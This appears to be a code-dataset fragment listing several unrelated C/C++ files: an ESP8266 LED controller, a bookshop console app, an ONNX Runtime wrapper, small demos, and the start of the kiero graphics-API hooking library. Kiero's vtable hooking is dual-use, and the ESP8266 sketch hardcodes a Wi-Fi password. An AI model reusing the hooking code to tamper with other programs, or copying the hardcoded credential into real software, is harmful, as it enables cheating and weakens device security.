    "#include <ESP8266WiFi.h>\n#include <FastLED.h>\n#include <LittleFS.h>\n#include <ESP8266WebServer.h>\n#include <WebSocketsServer.h>\n\n#define LED_PIN D1\n#define NUM_LEDS 60\n#define SWITCH D2\n#define BRIGHTNESS 255\n#define FRAMES_PER_SECOND 120\n\nCRGB leds[NUM_LEDS];\nESP8266WebServer server(80);\nWebSocketsServer webSocket(81);\nuint8_t gHue = 0;\n\n// Default color (red in HSV)\nCHSV defaultColor = CHSV(0, 255, 255);\nCHSV currentColor = defaultColor;\nbool colorChanged = false;\nCHSV newColor = defaultColor;\n\n// Function declarations\nvoid handleRoot();\nvoid handleWebSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length);\nvoid setColor(CHSV color);\nvoid rainbow_wave();\n\nvoid setup() {\n  Serial.begin(115200);\n  FastLED.addLeds<WS2811, LED_PIN, BRG>(leds, NUM_LEDS);\n  FastLED.setBrightness(BRIGHTNESS);\n\n  // Set up WiFi AP\n  WiFi.softAP(\"BimmerColor\", \"Cbears04\"); \n  IPAddress local_IP(192, 168, 4, 1);\n  IPAddress gateway(192, 168, 4, 1);\n  IPAddress subnet(255, 255, 255, 0);\n  WiFi.softAPConfig(local_IP, gateway, subnet);\n\n  if (!LittleFS.begin()) {\n    Serial.println(\"Failed to mount file system\");\n    return;\n  }\n\n  // Set up web server\n  server.on(\"/\", HTTP_GET, handleRoot);\n  server.serveStatic(\"/style.css\", LittleFS, \"/style.css\");\n  server.serveStatic(\"/iro.min.js\", LittleFS, \"/iro.min.js\");\n  server.begin();\n\n  // Set up WebSocket server\n  webSocket.begin();\n  webSocket.onEvent(handleWebSocketEvent);\n\n  // Initialize LED strip with default color\n  pinMode(LED_PIN, OUTPUT);\n  setColor(defaultColor);\n\n  // Initialize switch\n  pinMode(SWITCH, OUTPUT);\n  digitalWrite(SWITCH, HIGH);\n}\n\nvoid loop() {\n  server.handleClient();\n  webSocket.loop();\n\n  // Check switch state to toggle between modes\n  if (digitalRead(SWITCH) == HIGH) {\n    if (colorChanged) {\n      setColor(newColor);\n      FastLED.show();\n      colorChanged = false;\n      delay(50);\n    }\n  } else {\n    rainbow_wave();\n    FastLED.show();\n    FastLED.delay(1000 / FRAMES_PER_SECOND);\n  }\n}\n\nvoid handleRoot() {\n  File file = LittleFS.open(\"/index.html\", \"r\");\n  if (!file) {\n    server.send(404, \"text/plain\", \"File not found\");\n    return;\n  }\n  server.streamFile(file, \"text/html\");\n  file.close();\n}\n\nvoid handleWebSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {\n  switch (type) {\n    case WStype_DISCONNECTED:\n      Serial.printf(\"[%u] Disconnected!\\n\", num);\n      break;\n    case WStype_TEXT:\n      if (length > 0) {\n        String message = String((char *)payload);\n        if (message.startsWith(\"hsv:\")) {\n          String hsvValue = message.substring(4); // Skip \"hsv:\" prefix\n          int firstComma = hsvValue.indexOf(',');\n          int secondComma = hsvValue.indexOf(',', firstComma + 1);\n\n          uint8_t h = hsvValue.substring(0, firstComma).toInt();\n          uint8_t s = hsvValue.substring(firstComma + 1, secondComma).toInt();\n          uint8_t v = hsvValue.substring(secondComma + 1).toInt();\n\n          newColor = CHSV(h, s, v);\n          colorChanged = true;\n        } else if (message.startsWith(\"animation:\")) {\n          // Handle animation message if needed\n        }\n      }\n      break;\n    default:\n      break;\n  }\n}\n\nvoid setColor(CHSV color) {\n  fill_solid(leds, NUM_LEDS, color);\n\n  // Print HSV components\n  Serial.printf(\"H: %d, S: %d, V: %d\\n\", color.hue, color.saturation, color.value);\n}\n\nvoid rainbow_wave() {\n  fill_rainbow(leds, NUM_LEDS, gHue, 7);\n  \n  gHue++;\n}\n",
    "#include <iostream>\r\n#include <list>\r\n#include <vector>\r\n \r\nusing namespace std;\r\n \r\n\r\nvector <string> bookNameList ;\r\nvector <double> bookPriceList ;\r\nvector <string> bookIdList; \r\n\r\n\r\n\r\n\r\n\r\n// print the menu options for the bookshop manager \r\nvoid printManagerMenu(){\r\n    cout << \"\\t| Manager menu |\"<< endl<< endl;\r\n    cout <<\"Press [1] to View books\" <<endl;\r\n    cout <<\"Press [2] to Add books\" <<endl;\r\n    cout <<\"Press [3] to Search books\" <<endl;\r\n    cout <<\"Press [4] to View book orders\" <<endl;\r\n    cout <<\"Press [5] to prepare quotations\" <<endl;\r\n    cout <<\"Press [6] to Add discounts\" <<endl << endl;\r\n    cout << \"Enter your choice here: \";\r\n    \r\n    \r\n    \r\n}\r\n\r\n\r\nvoid addBook(){\r\n\r\n    bool addAnotherBook = false;\r\n    do{\r\n        string bookName;\r\n        string bookID;\r\n        double bookPrice;\r\n        cout<< endl << \"Enter the book name: \"; // get the book name from the user and add it to the vector\r\n        getline(cin >> ws, bookName);\r\n        bookNameList.push_back(bookName);\r\n\r\n        cout << \"Enter book ID: \"; // get the book ID from the user and add it to the vector\r\n        cin >> bookID;\r\n        bookIdList.push_back(bookID);\r\n\r\n        cout << \"Enter the book price: \"; //get the book price from the user and add it to the vector\r\n        cin >> bookPrice;\r\n        bookPriceList.push_back(bookPrice);\r\n\r\n        char userInput;\r\n        cout << endl<< \"Press [Y] for yes and [N] for no \" << endl; // ask the user whether he want add another book or not\r\n        cout << \"Do you want to add another book: \";\r\n        cin >>  userInput;\r\n\r\n        if (toupper(userInput)== 'Y')\r\n        {\r\n           addAnotherBook = true;\r\n        }else\r\n        {\r\n            addAnotherBook= false;\r\n        }\r\n        \r\n        \r\n    }while(addAnotherBook);\r\n\r\n\r\n    \r\n}\r\n\r\nvoid viewBook(){\r\n    if (true)\r\n    {\r\n        cout <<\"\\t\\t*********************\" << endl;\r\n        cout <<\"\\t\\t|  Nethra Book shop |\" << endl;\r\n        cout <<\"\\t\\t*********************\" << endl<< endl;\r\n        cout << \"book Name\\t\\tBook ID\\t\\t\\tPrice\" << endl<< endl;\r\n\r\n        for (int i = 0; i < bookNameList.size(); i++)\r\n        {\r\n            cout << bookNameList[i] << \"\\t\\t\\t\" << bookIdList[i] << \"\\t\\t\\t\" <<bookPriceList[i] <<endl;\r\n        }\r\n        \r\n        \r\n\r\n    }else\r\n    {\r\n        cout << \" OOPS! no books to view \";\r\n    }\r\n    \r\n    \r\n\r\n}\r\n \r\nvoid searchBook(){\r\n\r\n    string bookToSearch;\r\n    bool isBookFound=false;\r\n    cout << \"Enter the name of the book you want: \"; \r\n    getline(cin >> ws,bookToSearch);\r\n\r\n    for (int i = 0; i < bookNameList.size(); i++) \r\n    {\r\n        if (bookNameList[i]==bookToSearch) \r\n        {\r\n            cout << endl<< \"The book \"<< bookToSearch << \" is available\"<< endl;\r\n            cout << \"*****************************************\"<< endl;\r\n            cout << \"Book Name: \" << bookNameList[i]<<endl;\r\n            cout << \"Book ID: \" << bookIdList[i]<< endl;\r\n            cout << \"Book price: \"<< bookPriceList[i]<<endl;\r\n            cout<< \"*******************************************\"<<endl;\r\n            isBookFound=true;\r\n\r\n        }\r\n\r\n        \r\n    }\r\n    if (! isBookFound)\r\n    {\r\n       cout << \"The book you enterd not available in the store \"<<endl; \r\n    }\r\n    \r\n    \r\n\r\n\r\n\r\n\r\n}\r\n\r\n\r\nvoid managerMenuAction(){\r\n    bool viewManagerMenuAgain=false;\r\n    do{\r\n        int userInput;\r\n        cin >> userInput;\r\n\r\n        switch (userInput)\r\n        {\r\n        case 1:\r\n            viewBook(); //call view book fuction \r\n            break;\r\n        case 2:\r\n            addBook(); // call view add Book function\r\n            break;\r\n        case 3:\r\n            searchBook();\r\n            break;\r\n        case 4:\r\n            cout<<\"call the view book orders function\";\r\n            break;\r\n        case 5:\r\n            cout << \"call the prepare quotations function\";\r\n            break;\r\n        case 6:\r\n            cout<<\"call the add discount function\";\r\n            break;\r\n        default:\r\n            cout <<\"incorrect input\";\r\n            break;\r\n        }\r\n\r\n        char input;\r\n        cout << endl<< \"Please enter [Y] for yes and [N] for no\";\r\n        cout <<endl<< \"Do you want to go for the menu again: \";\r\n        cin >> input;\r\n        if (toupper(input)=='Y')\r\n        {\r\n            viewManagerMenuAgain=true;\r\n            printManagerMenu();\r\n        }else\r\n        {\r\n            viewManagerMenuAgain= false;\r\n        }\r\n        \r\n        \r\n\r\n    }while(viewManagerMenuAgain);\r\n\r\n\r\n}\r\n\r\n\r\nint main() {\r\n    char userChoice;\r\n    cout << \"Are you a Manager or a Customer \" << endl ;\r\n    cout << \"Press [M] to select Manager and [C] for the Customer :\";\r\n    cin >> userChoice;\r\n    //select whether the user is  manager or a customer\r\n    if (toupper(userChoice)== 'M') // capitalize the user input \r\n    {\r\n        cout<< \"manager selected\"<< endl ;\r\n        printManagerMenu();\r\n        managerMenuAction();\r\n    }else if (toupper(userChoice)=='C')\r\n    {\r\n        cout << \"Customer se",
    "/**\n * @file    OrtSessionHandler.cpp\n *\n * @author  btran\n *\n */\n\n\n#include <time.h>\n#include <iostream>\n\n#include <../onnxruntime/include/onnxruntime/core/session/onnxruntime_c_api.h>\n#include <../onnxruntime/include/onnxruntime/core/session/onnxruntime_cxx_api.h>\n\n\n#if ENABLE_TENSORRT\n#include <onnxruntime/core/providers/tensorrt/tensorrt_provider_factory.h>\n#endif\n\n#include <ort_utility/ort_utility.hpp>\n\n#include <algorithm>\n#include <cassert>\n#include <numeric>\n#include <sstream>\n\nnamespace\n{\nstd::string toString(const ONNXTensorElementDataType dataType)\n{\n    switch (dataType) {\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_FLOAT: {\n            return \"float\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_UINT8: {\n            return \"uint8_t\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_INT8: {\n            return \"int8_t\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_UINT16: {\n            return \"uint16_t\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_INT16: {\n            return \"int16_t\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_INT32: {\n            return \"int32_t\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_INT64: {\n            return \"int64_t\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_STRING: {\n            return \"string\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_BOOL: {\n            return \"bool\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_FLOAT16: {\n            return \"float16\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_DOUBLE: {\n            return \"double\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_UINT32: {\n            return \"uint32_t\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_UINT64: {\n            return \"uint64_t\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_COMPLEX64: {\n            return \"complex with float32 real and imaginary components\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_COMPLEX128: {\n            return \"complex with float64 real and imaginary components\";\n        }\n        case ONNX_TENSOR_ELEMENT_DATA_TYPE_BFLOAT16: {\n            return \"complex with float64 real and imaginary components\";\n        }\n        default:\n            return \"undefined\";\n    }\n}\n}  // namespace\n\nnamespace Ort\n{\n//-----------------------------------------------------------------------------//\n// OrtSessionHandlerIml Definition\n//-----------------------------------------------------------------------------//\n\nclass OrtSessionHandler::OrtSessionHandlerIml\n{\n public:\n    OrtSessionHandlerIml(const std::string& modelPath,         //\n                         const std::optional<size_t>& gpuIdx,  //\n                         const std::optional<std::vector<std::vector<int64_t>>>& inputShapes);\n    ~OrtSessionHandlerIml();\n\n    std::vector<DataOutputType> operator()(const std::vector<float*>& inputData) const;\n\n    void updateInputShapes(const std::vector<std::vector<int64_t>>& inputShapes)\n    {\n        if (inputShapes.size() != m_numInputs) {\n            DEBUG_LOG(\"inputShapes must be of size: %d\", m_numInputs);\n            return;\n        }\n        m_inputShapes = inputShapes;\n\n        for (int i = 0; i < m_numInputs; i++) {\n            const auto& curInputShape = m_inputShapes[i];\n            m_inputTensorSizes[i] =\n                std::accumulate(std::begin(curInputShape), std::end(curInputShape), 1, std::multiplies<int64_t>());\n        }\n    }\n\n private:\n    void initSession();\n    void initModelInfo();\n\n private:\n    std::string m_modelPath;\n\n    mutable Ort::Session m_session;\n    Ort::Env m_env;\n    Ort::AllocatorWithDefaultOptions m_ortAllocator;\n\n    std::optional<size_t> m_gpuIdx;\n\n    std::vector<std::vector<int64_t>> m_inputShapes;\n    std::vector<std::vector<int64_t>> m_outputShapes;\n\n    std::vector<int64_t> m_inputTensorSizes;\n    std::vector<int64_t> m_outputTensorSizes;\n\n    uint8_t m_numInputs;\n    uint8_t m_numOutputs;\n\n    std::vector<char*> m_inputNodeNames;\n    std::vector<char*> m_outputNodeNames;\n\n    bool m_inputShapesProvided = false;\n};\n\n//-----------------------------------------------------------------------------//\n// OrtSessionHandler\n//-----------------------------------------------------------------------------//\n\nOrtSessionHandler::OrtSessionHandler(const std::string& modelPath,         //\n                                     const std::optional<size_t>& gpuIdx,  //\n                                     const std::optional<std::vector<std::vector<int64_t>>>& inputShapes)\n    : m_piml(std::make_unique<OrtSessionHandlerIml>(modelPath,  //\n                                                    gpuIdx,     //\n                                                    inputShapes))\n{\n}\n\nOrtSessionHandler::~OrtSessionHandler() = default;\n\nstd::vector<OrtSessionHandler::DataOutputType>\nOrtSessionHandler::operator()(const std::vector<float*>& inputImgData) const\n{\n    return this->m_piml->operator()(inputImgData);\n}\n\n//-------------------------------------",
    "//\n// Created by \u5b8b\u5065\u661f on 2024/7/2.\n//\n/* \u76ee\u7684\u662f\u89e3\u51b3\u589e\u52a0\u7b80\u5355\u5de5\u5382\u589e\u52a0\u4ea7\u54c1\u5c31\u8981\u4fee\u6539\u5de5\u5382\u7c7b\u7684\u95ee\u9898\n *\n *\n */\n#include <iostream>\n\nusing namespace std;\n\n//\u4ea7\u54c1\u7236\u7c7b\nclass AbstractSmile{\npublic:\n    virtual void transform() = 0;\n    virtual void ability() = 0;\n    virtual ~AbstractSmile(){}\n};\n\nclass SheepSmile: public AbstractSmile{\npublic:\n    void transform() override{\n        cout << \"SheepSmile transform\" << endl;\n    }\n\n    void ability() override{\n        cout << \"SheepSmile ability\" << endl;\n    }\n};\n\nclass LionSmile: public AbstractSmile{\npublic:\n    void transform() override{\n        cout << \"LionSmile transform\" << endl;\n    }\n\n    void ability() override{\n        cout << \"LionSmile ability\" << endl;\n    }\n};\n\nclass BatSmile: public AbstractSmile{\npublic:\n    void transform() override{\n        cout << \"BatSmile transform\" << endl;\n    }\n\n    void ability() override{\n        cout << \"BatSmile ability\" << endl;\n    }\n};\n\n//\u5b9a\u4e49\u5de5\u5382\u51fd\u6570\u5236\u9020\u6076\u9b54\u679c\u5b9e\nclass AbstractFactory{\npublic:\n    virtual AbstractSmile* createSmile() = 0;\n    virtual ~AbstractFactory(){}\n};\n\nclass SheepFactory: public AbstractFactory{\npublic:\n    AbstractSmile* createSmile() override{\n        return new SheepSmile;\n    }\n    ~SheepFactory(){}\n};\n\nclass LionFactory: public AbstractFactory{\npublic:\n    AbstractSmile* createSmile() override{\n        return new LionSmile;\n    }\n    ~LionFactory(){}\n};\n\nclass BatFactory: public AbstractFactory{\npublic:\n    AbstractSmile* createSmile() override{\n        return new BatSmile;\n    }\n    ~BatFactory(){}\n};\n\n\n\nint main() {\n    AbstractFactory* factory = new LionFactory;\n    AbstractSmile* obj = factory->createSmile();\n    obj->ability();\n    obj->transform();\n    delete factory;\n    delete obj;\n\n    return 0;\n}\n",
    "#include <opencv2/opencv.hpp>\n#include <iostream>\n\nusing namespace std;\n\nint main() {\n    string filePath;\n    double scalePercent;\n    cout << \"Enter filePath: \";\n    cin >> filePath;\n\n    cout << \"Enter scale percentage (e.g., 50 for 50%): \";\n    cin >> scalePercent;\n\n    cv::VideoCapture cap(filePath);\n    if (!cap.isOpened()) {\n        cerr << \"Error: no video file found\";\n        return -1;\n    }\n\n    cv::Mat frame, grayFrame;\n    while (true) {\n        cap >> frame;\n        system(\"clear\");\n        if (frame.empty()) {\n            break;\n        }\n        cv::resize(frame, frame, cv::Size(), scalePercent/100, scalePercent/100);\n\n        cv::cvtColor(frame, grayFrame, cv::COLOR_BGR2GRAY);\n\n        for (int y = 0; y < grayFrame.rows; y++) {\n            for (int x = 0; x < grayFrame.cols; x++) {\n                uchar intensity = grayFrame.at<uchar>(y, x);\n                if (intensity < 24) {\n                    cout << \" @ \";\n                } else if (intensity < 48) {\n                    cout << \" % \";\n                } else if (intensity < 72) {\n                    cout << \" # \";\n                } else if (intensity < 96) {\n                    cout << \" * \";\n                } else if (intensity < 120) {\n                    cout << \" + \";\n                } else if (intensity < 144) {\n                    cout << \" = \";\n                } else if (intensity < 168) {\n                    cout << \" - \";\n                } else if (intensity < 192) {\n                    cout << \" : \";\n                } else if (intensity < 216) {\n                    cout << \" . \";\n                } else {\n                    cout << \"   \";\n                }\n            }\n            cout << \"\\n\";\n        }\n\n        if (cv::waitKey(1) == 27) {  \n            break;\n        }\n    }\n\n    cap.release();\n    return 0;\n}",
    "// C++ program to implement tic tac toe game \r\n#include <iostream> \r\nusing namespace std; \r\n\r\n// Function to draw the Tic-Tac-Toe board \r\nvoid drawBoard(char board[3][3]) \r\n{ \r\n\tcout << \"-------------\\n\"; \r\n\tfor (int i = 0; i < 3; i++) { \r\n\t\tcout << \"| \"; \r\n\t\tfor (int j = 0; j < 3; j++) { \r\n\t\t\tcout << board[i][j] << \" | \"; \r\n\t\t} \r\n\t\tcout << \"\\n-------------\\n\"; \r\n\t} \r\n} \r\n\r\n// Function to check for a win \r\nbool checkWin(char board[3][3], char player) \r\n{ \r\n\t// Check rows, columns, and diagonals \r\n\tfor (int i = 0; i < 3; i++) { \r\n\t\tif (board[i][0] == player && board[i][1] == player \r\n\t\t\t&& board[i][2] == player) \r\n\t\t\treturn true; \r\n\t\tif (board[0][i] == player && board[1][i] == player \r\n\t\t\t&& board[2][i] == player) \r\n\t\t\treturn true; \r\n\t} \r\n\tif (board[0][0] == player && board[1][1] == player \r\n\t\t&& board[2][2] == player) \r\n\t\treturn true; \r\n\tif (board[0][2] == player && board[1][1] == player \r\n\t\t&& board[2][0] == player) \r\n\t\treturn true; \r\n\treturn false; \r\n} \r\n\r\nint main() \r\n{ \r\n\t// Initialize the board and players \r\n\tchar board[3][3] = { { ' ', ' ', ' ' }, \r\n\t\t\t\t\t\t{ ' ', ' ', ' ' }, \r\n\t\t\t\t\t\t{ ' ', ' ', ' ' } }; \r\n\tchar player = 'X'; \r\n\tint row, col; \r\n\tint turn; // Declare turn here \r\n\r\n\tcout << \"Welcome to Tic-Tac-Toe!\\n\"; \r\n\r\n\t// Game loop \r\n\tfor (turn = 0; turn < 9; turn++) { \r\n\t\t// Draw the board \r\n\t\tdrawBoard(board); \r\n\r\n\t\t// Prompt for valid input \r\n\t\twhile (true) { \r\n\t\t\tcout << \"Player \" << player \r\n\t\t\t\t<< \", enter row (0-2) and column (0-2): \"; \r\n\t\t\tcin >> row >> col; \r\n\r\n\t\t\tif (board[row][col] != ' ' || row < 0 || row > 2 \r\n\t\t\t\t|| col < 0 || col > 2) { \r\n\t\t\t\tcout << \"Invalid move. Try again.\\n\"; \r\n\t\t\t} \r\n\t\t\telse { \r\n\t\t\t\tbreak; // Valid input, exit the loop. \r\n\t\t\t} \r\n\t\t} \r\n\r\n\t\t// Make the move \r\n\t\tboard[row][col] = player; \r\n\r\n\t\t// Check for a win after making a move \r\n\t\tif (checkWin(board, player)) { \r\n\t\t\tdrawBoard(board); \r\n\t\t\tcout << \"Player \" << player << \" wins!\\n\"; \r\n\t\t\tbreak; // Exit the loop after a win. \r\n\t\t} \r\n\r\n\t\t// Switch to the other player \r\n\t\tplayer = (player == 'X') ? 'O' : 'X'; \r\n\t} \r\n\r\n\t// End of the game \r\n\tdrawBoard(board); \r\n\r\n\t// Check for a draw \r\n\tif (turn == 9 && !checkWin(board, 'X') \r\n\t\t&& !checkWin(board, 'O')) { \r\n\t\tcout << \"It's a draw!\\n\"; \r\n\t} \r\n\r\n\treturn 0; \r\n}\r\n\r\n",
    "#include \"rtweekend.h\"\n#include \"hittable_list.h\"\n#include \"sphere/v2.h\"\n#include \"material/v4.h\"\n\n#define USE_MATERIAL_V4\n\n#include \"cameras/v5.h\"\n\n\nint main() {\n    hittable_list world;\n\n    auto ground_material = make_shared<lambertian>(color(0.5, 0.5, 0.5));\n    world.add(make_shared<sphere>(point3(0, -1000, 0), 1000, ground_material));\n\n    for (int a = -1; a < 1; a++) {\n        for (int b = -3; b < 3; b++) {\n            auto choose_mat = random_double();\n            point3 center(a + 0.9 * random_double(), 0.2, b + 0.9 * random_double());\n\n            if ((center - point3(4, 0.2, 0)).length() > 0.9) {\n                shared_ptr<material> sphere_material;\n\n                if (choose_mat < 0.8) {\n                    // diffuse\n                    auto albedo = color::random() * color::random();\n                    sphere_material = make_shared<lambertian>(albedo);\n                    world.add(make_shared<sphere>(center, 0.2, sphere_material));\n                } else if (choose_mat < 0.95) {\n                    // metal\n                    auto albedo = color::random(0.5, 1);\n                    auto fuzz = random_double(0, 0.5);\n                    sphere_material = make_shared<metal>(albedo, fuzz);\n                    world.add(make_shared<sphere>(center, 0.2, sphere_material));\n                } else {\n                    // glass\n                    sphere_material = make_shared<dielectric>(1.5);\n                    world.add(make_shared<sphere>(center, 0.2, sphere_material));\n                }\n            }\n        }\n    }\n\n    auto material1 = make_shared<dielectric>(1.5);\n    world.add(make_shared<sphere>(point3(0, 1, 0), 1.0, material1));\n\n    auto material2 = make_shared<lambertian>(color(0.4, 0.2, 0.1));\n    world.add(make_shared<sphere>(point3(-4, 1, 0), 1.0, material2));\n\n    auto material3 = make_shared<metal>(color(0.7, 0.6, 0.5), 0.0);\n    world.add(make_shared<sphere>(point3(4, 1, 0), 1.0, material3));\n\n    camera cam;\n\n    cam.aspect_ratio = 16.0 / 9.0;\n    cam.image_width = 1200;\n    cam.samples_per_pixel = 500;\n    cam.max_depth = 50;\n\n    cam.vfov = 20;\n    cam.lookfrom = point3(13, 2, 3);\n    cam.lookat = point3(0, 0, 0);\n    cam.vup = vec3(0, 1, 0);\n\n    cam.defocus_angle = 0.6;\n    cam.focus_dist = 10.0;\n\n    cam.render(world);\n}",
    "#include \"kiero.h\"\n#include <Windows.h>\n#include <assert.h>\n\n#if KIERO_INCLUDE_D3D9\n# include <d3d9.h>\n#endif\n\n#if KIERO_INCLUDE_D3D10\n# include <dxgi.h>\n# include <d3d10_1.h>\n# include <d3d10.h>\n#endif\n\n#if KIERO_INCLUDE_D3D11\n# include <dxgi.h>\n# include <d3d11.h>\n#endif\n\n#if KIERO_INCLUDE_D3D12\n# include <dxgi.h>\n# include <d3d12.h>\n#endif\n\n#if KIERO_INCLUDE_OPENGL\n# include <gl/GL.h>\n#endif\n\n#if KIERO_INCLUDE_VULKAN\n# include <vulkan/vulkan.h>\n#endif\n\n#if KIERO_USE_MINHOOK\n# include \"../../include/MinHook.h\"\n#endif\n\n#ifdef _UNICODE\n# define KIERO_TEXT(text) L##text\n#else\n# define KIERO_TEXT(text) text\n#endif\n\n#define KIERO_ARRAY_SIZE(arr) ((size_t)(sizeof(arr)/sizeof(arr[0])))\n\nstatic kiero::RenderType::Enum g_renderType = kiero::RenderType::None;\nstatic uint150_t* g_methodsTable = NULL;\n\nkiero::Status::Enum kiero::init(RenderType::Enum _renderType)\n{\n\tif (g_renderType != RenderType::None)\n\t{\n\t\treturn Status::AlreadyInitializedError;\n\t}\n\n\tif (_renderType != RenderType::None)\n\t{\n\t\tif (_renderType >= RenderType::D3D9 && _renderType <= RenderType::D3D12)\n\t\t{\n\t\t\tWNDCLASSEX windowClass;\n\t\t\twindowClass.cbSize = sizeof(WNDCLASSEX);\n\t\t\twindowClass.style = CS_HREDRAW | CS_VREDRAW;\n\t\t\twindowClass.lpfnWndProc = DefWindowProc;\n\t\t\twindowClass.cbClsExtra = 0;\n\t\t\twindowClass.cbWndExtra = 0;\n\t\t\twindowClass.hInstance = GetModuleHandle(NULL);\n\t\t\twindowClass.hIcon = NULL;\n\t\t\twindowClass.hCursor = NULL;\n\t\t\twindowClass.hbrBackground = NULL;\n\t\t\twindowClass.lpszMenuName = NULL;\n\t\t\twindowClass.lpszClassName = KIERO_TEXT(\"Kiero\");\n\t\t\twindowClass.hIconSm = NULL;\n\n\t\t\t::RegisterClassEx(&windowClass);\n\n\t\t\tHWND window = ::CreateWindow(windowClass.lpszClassName, KIERO_TEXT(\"Kiero DirectX Window\"), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, NULL, NULL, windowClass.hInstance, NULL);\n\n\t\t\tif (_renderType == RenderType::D3D9)\n\t\t\t{\n#if KIERO_INCLUDE_D3D9\n\t\t\t\tHMODULE libD3D9;\n\t\t\t\tif ((libD3D9 = ::GetModuleHandle(KIERO_TEXT(\"d3d9.dll\"))) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::ModuleNotFoundError;\n\t\t\t\t}\n\n\t\t\t\tvoid* Direct3DCreate9;\n\t\t\t\tif ((Direct3DCreate9 = ::GetProcAddress(libD3D9, \"Direct3DCreate9\")) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tLPDIRECT3D9 direct3D9;\n\t\t\t\tif ((direct3D9 = ((LPDIRECT3D9(__stdcall*)(uint32_t))(Direct3DCreate9))(D3D_SDK_VERSION)) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tD3DDISPLAYMODE displayMode;\n\t\t\t\tif (direct3D9->GetAdapterDisplayMode(D3DADAPTER_DEFAULT, &displayMode) < 0)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tD3DPRESENT_PARAMETERS params;\n\t\t\t\tparams.BackBufferWidth = 0;\n\t\t\t\tparams.BackBufferHeight = 0;\n\t\t\t\tparams.BackBufferFormat = displayMode.Format;\n\t\t\t\tparams.BackBufferCount = 0;\n\t\t\t\tparams.MultiSampleType = D3DMULTISAMPLE_NONE;\n\t\t\t\tparams.MultiSampleQuality = NULL;\n\t\t\t\tparams.SwapEffect = D3DSWAPEFFECT_DISCARD;\n\t\t\t\tparams.hDeviceWindow = window;\n\t\t\t\tparams.Windowed = 1;\n\t\t\t\tparams.EnableAutoDepthStencil = 0;\n\t\t\t\tparams.AutoDepthStencilFormat = D3DFMT_UNKNOWN;\n\t\t\t\tparams.Flags = NULL;\n\t\t\t\tparams.FullScreen_RefreshRateInHz = 0;\n\t\t\t\tparams.PresentationInterval = 0;\n\n\t\t\t\tLPDIRECT3DDEVICE9 device;\n\t\t\t\tif (direct3D9->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, window, D3DCREATE_SOFTWARE_VERTEXPROCESSING | D3DCREATE_DISABLE_DRIVER_MANAGEMENT, &params, &device) < 0)\n\t\t\t\t{\n\t\t\t\t\tdirect3D9->Release();\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tg_methodsTable = (uint150_t*)::calloc(119, sizeof(uint150_t));\n\t\t\t\t::memcpy(g_methodsTable, *(uint150_t**)device, 119 * sizeof(uint150_t));\n\n#if KIERO_USE_MINHOOK\n\t\t\t\tMH_Initialize();\n#endif\n\n\t\t\t\tdirect3D9->Release();\n\t\t\t\tdirect3D9 = NULL;\n\n\t\t\t\tdevice->Release();\n\t\t\t\tdevice = NULL;\n\n\t\t\t\tg_renderType = RenderType::D3D9;\n\n\t\t\t\t::DestroyWindow(window);\n\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\n\t\t\t\treturn Status::Success;\n#endif\n\t\t\t}\n\t\t\telse if (_renderType == RenderType::D3D10)\n\t\t\t{\n#if KIERO_INCLUDE_D3D10\n\t\t\t\tHMODULE libDXGI;\n\t\t\t\tHMODULE libD3D10;\n\t\t\t\tif ((libDXGI = ::GetModuleHandle(KIERO_TEXT(\"dxgi.dll\"))) == NULL || (libD3D10 = ::GetModuleHandle(KIERO_TEXT(\"d3d10.dll\"))) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::ModuleNotFoundError;\n\t\t\t\t}\n\n\t\t\t\tvoid* CreateDXGIFactory;\n\t\t\t\tif ((CreateDXGIFactory = ::GetProcAddress(libDXGI, \"CreateDXGIFactory\")) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t",
